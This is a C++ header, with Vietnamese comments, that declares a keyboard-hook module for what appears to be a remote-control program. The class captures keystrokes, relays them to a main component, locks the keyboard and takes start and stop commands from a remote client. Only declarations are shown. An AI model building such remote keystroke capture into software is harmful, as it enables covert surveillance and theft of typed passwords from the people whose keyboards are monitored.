// KeyManager.hpp
#pragma once

#include <string>
#include <functional>
#include <thread>
#include <string>
#include <functional>
#include <thread>
#include <nlohmann/json.hpp>
#include "../interfaces/IRemoteModule.hpp"

#if _WIN32
#include <windows.h>
#else
#include <map>
#include <fstream>
#include <atomic>
#include <fcntl.h>      // open
#include <unistd.h>     // close, read
#include <linux/input.h>// struct input_event, KEY_*
#include <dirent.h>     // scandir
#include <cstring>
#include <sys/ioctl.h>
#include <iostream>
#endif

using json = nlohmann::json;

// Định nghĩa kiểu hàm callback: nhận vào 1 chuỗi ký tự (phím vừa nhấn)
using KeyCallback = std::function<void(std::string key_char)>;

class KeyManager : public IRemoteModule {
public:
    // Thiết lập hàm xử lý khi có phím nhấn (để gửi về Main)
    static void set_callback(KeyCallback cb);

    // Bắt đầu theo dõi bàn phím
    void start_hook();

    // Dừng theo dõi
    void stop_hook();

    // Lock bàn phím
    static void set_locked(bool locked);

    const std::string& get_module_name() const override { 
        static const std::string name = "KEYBOARD"; 
        return name; 
    }

    // Hàm xử lý lệnh từ Client (Start/Stop)
    json handle_command(const json& request) override;

private:
    // Thread để chạy vòng lặp tin nhắn
    std::thread hookThread;
};
